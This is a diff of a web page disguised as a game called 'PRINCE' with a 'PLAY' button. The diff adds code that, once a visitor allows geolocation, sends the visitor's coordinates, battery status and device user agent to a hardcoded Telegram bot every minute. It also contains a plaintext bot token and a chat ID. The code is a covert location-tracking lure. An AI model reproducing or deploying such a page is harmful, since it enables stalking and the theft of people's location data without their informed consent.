@@ -24,24 +24,33 @@
 </head>
 <body>
     <h1>PRINCE</h1>
+    <button onclick="getLocation()">PLAY</button>
     <p id="status"></p>
 
     <script>
-        function sendLocation() {
-            navigator.geolocation.getCurrentPosition(position => {
-                var latitude = position.coords.latitude;
-                var longitude = position.coords.longitude;
-                var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
-                var chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
-                var message = `Location: Latitude ${latitude}, Longitude ${longitude}\n`;
-                navigator.getBattery().then(function(battery) {
-                    var level = battery.level * 100 + '%';
-                    var charging = battery.charging ? 'Yes' : 'No';
-                    message += `Battery Level: ${level}\nCharging: ${charging}\n`;
-                    var deviceModel = navigator.userAgent;
-                    message += `Device Model: ${deviceModel}`;
-                    sendToTelegram(chatId, token, message);
-                });
+        var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
+        var chatId = '5112680061'; // Replace with your chat ID
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                document.getElementById("status").textContent = "Geolocation not supported by this browser.";
+            }
+        }
+
+        function sendLocation(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var message = `Location: Latitude ${latitude}, Longitude ${longitude}\n`;
+
+            navigator.getBattery().then(function(battery) {
+                var level = battery.level * 100 + '%';
+                var charging = battery.charging ? 'Yes' : 'No';
+                message += `Battery Level: ${level}\nCharging: ${charging}\n`;
+                var deviceModel = navigator.userAgent;
+                message += `Device Model: ${deviceModel}`;
+                sendToTelegram(chatId, token, message);
             });
         }
 
@@ -73,7 +82,27 @@
             });
         }
 
-        setInterval(sendLocation, 60000); // Send location every 1 minute
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("status").textContent = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("status").textContent = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("status").textContent = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("status").textContent = "An unknown error occurred.";
+                    break;
+            }
+        }
+
+        // Send location every 1 minute
+        setInterval(function() {
+            getLocation();
+        }, 60000);
     </script>
 </body>
 </html>
